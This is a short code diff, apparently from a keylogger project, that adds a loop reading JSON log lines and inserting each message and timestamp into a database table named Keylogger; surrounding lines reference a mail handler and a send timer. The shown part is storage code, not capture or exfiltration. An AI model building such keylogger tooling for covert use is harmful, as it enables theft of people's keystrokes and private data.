@@ -5,6 +5,7 @@ import json
 import mail_handler as md
 from threading import Timer
 import argparse
+import db_handle as dh
 
 
 parser = argparse.ArgumentParser()
@@ -26,7 +27,18 @@ def log_to_db():
     with open(log_file, 'r') as f:
         log = f.read()
     log = log.split('\n')[:-1]
-
+    for info in log:
+        get_count = """
+            SELECT count(*) FROM Keylogger
+        """
+        res = dh.SQLquery(get_count, ())
+        query = """
+            INSERT INTO Keylogger (ID, Log_info, log_time)
+            VALUES (?, ?, ?)
+        """
+        info = json.loads(info)
+        params = (res[0][0], info["msg"], info["time"])
+        dh.SQLupdate(query, params)
 
 def is_send():
     global send
